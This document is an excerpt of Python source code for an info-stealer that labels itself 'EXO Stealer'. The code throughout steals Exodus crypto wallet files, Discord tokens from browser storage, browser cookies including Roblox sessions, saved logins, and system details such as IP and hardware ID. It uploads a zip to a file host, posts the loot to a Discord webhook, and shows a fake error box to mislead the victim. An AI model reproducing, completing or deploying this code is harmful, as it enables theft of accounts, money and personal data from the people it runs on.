...
class Exodus:
    def __init__(self):
        ...
        try:
            self.path = os.path.join(
                os.environ["USERPROFILE"], "AppData", "Roaming", "Exodus"
            )
    ...
    def stealexo(self, path):
        ...
        with open(zip_path, "rb") as file:
            ...
            if response.ok:
                download = json.loads(response.content.decode("utf-8"))["data"]["file"][
                    "url"
                ]["short"]
                requests.post(
                    config["__HOOK__"],
...
class Cord:
    def __init__(self) -> None:
        ...
        paths = {
            ...
            "Epic Privacy Browser": self.local
            + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
            "Microsoft Edge": self.local
    ...
    def wsend(self):
        ...
        for token in self.tokens:
            ...
            avatar_url = (
                f"https://cdn.discordapp.com/avatars/{r['id']}/{r['avatar']}.gif"
                if requests.get(
                    f"https://cdn.discordapp.com/avatars/{r['id']}/{r['avatar']}.gif"
                ).status_code
                == 200
                else f"https://cdn.discordapp.com/avatars/{r['id']}/{r['avatar']}.png"
            )
            created = "`Error`"
                ...
                "embeds": [
                    {
                        ...
                        "fields": [
                            ...
                            {
                                "name": "Public",
                                "value": f"Badges : `{badges if badges != '' else 'False'}`\n\nCreated : {created}\n\nNitro : `{nitro}`",
                                "inline": True,
                            },
                            {
                                "name": "Nuking possibilities:",
                                "value": f"{servers if servers != '' else 'False'}",
                            },
                        ],
                        "thumbnail": {"url": f"{avatar_url}"},
                    }
                ],
                "username": "EXO Stealer",
...
class Browsers:
    ...
    def monkey(self, path: str) -> str:
        ...
        no_one_cares_about_this_key = base64.b64decode(
    ...
    def roblox_cookie(self, cookie):
        try:
            ...
            rapk = requests.get(
                f"https://inventory.roblox.com/v1/users/{id}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100"
            ).json()
            ...
            requests.post(
                ...
                json={
                    ...
                    "embeds": [
                        {
                            "description": f"[Rolimons](https://www.rolimons.com/player/{id}) | [Roblox](https://www.roblox.com/users/{id}/profile) | [Trade Link](https://www.roblox.com/users/{id}/trade)",
                            "color": 13290186,
                            "fields": [
                                ...
                                {"name": "UserID", "value": f"{id}", "inline": True},
                                {
                                    "name": "HasPremium",
                                    "value": "f{hasPremiumacc}",
                                    "inline": True,
                                },
    ...
    def cleanup(self):
        with open("exo.zip", "rb") as f:
            psite = requests.post(
                "https://api.anonfiles.com/upload", files={"file": f}
        ...
        requests.post(
            ...
            json={
                ...
                "embeds": [
                    {
                        "description": f"```diff{logins}```",
                        "color": 13290186,
                        "author": {"name": "Important Logins"},
                    }
                ],
                "username": "EXO Stealer",
                "avatar_url": "https://th.bing.com/th/id/R.bb9a91f3e3c5fe04758ad3c07dff0c0b?rik=1MwLfr%2bQ%2fADJ3w&pid=ImgRaw&r=0&adlt=strict",
                ...
                "embeds": [
                    {
                        ...
                        "fields": [
                            ...
                            {"name": "Location", "value": f"{c}", "inline": True},
                            {"name": "VPN", "value": f"{vpn}", "inline": True},
                            {"name": "Paths Found", "value": f"```diff\n+{paths}```"},
                            {"name": "Zip File", "value": f"{psite}"},
                        ],
                        "author": {"name": "Looks like someone ran exo !"},
                    }
                ],
                "username": "EXO Stealer",
                "avatar_url": "https://th.bing.com/th/id/R.bb9a91f3e3c5fe04758ad3c07dff0c0b?rik=1MwLfr%2bQ%2fADJ3w&pid=ImgRaw&r=0&adlt=strict",
            ...
            "embeds": [
                {
                    ...
                    "color": 0x03,
                    "fields": [
                        {"name": "PC", "value": f"`{info['PC']}`", "inline": True},
                        {"name": "RAM", "value": f"`{info['RAM']}`", "inline": True},
                        {"name": "OS", "value": f"`{info['OS']}`", "inline": True},
                        {"name": "CPU", "value": f"`{info['CPU']}`", "inline": True},
                        {"name": "GPU", "value": f"`{info['GPU']}`", "inline": True},
                        {
                            "name": "HWID",
                            "value": f"`{info['HWID']}`" if info["HWID"] else "Unknown",
                            "inline": True,
                        },
                        {"name": "IP", "value": f"`{info['IP']}`", "inline": True},
                    ],
                }
            ]
        }
...
class Config:
    ...
    def errorbox(self):
        ctypes.windll.user32.MessageBoxW(
            None, "Error code: 0x0003433\nFailed to load memory.", "Fatal Error", 2
        )


if __name__ == "__main__":

    da_opps = [AntiDebug, Config, System, Browsers, Cord, Exodus]
    ...
    payload = {
        ...
        "embeds": [
            {
                "color": 13290186,
                "author": {"name": "Exo has successfully completed"},
                "footer": {"text": "https://github.com/Syntheticc/EXO-Stealer"},
                "image": {
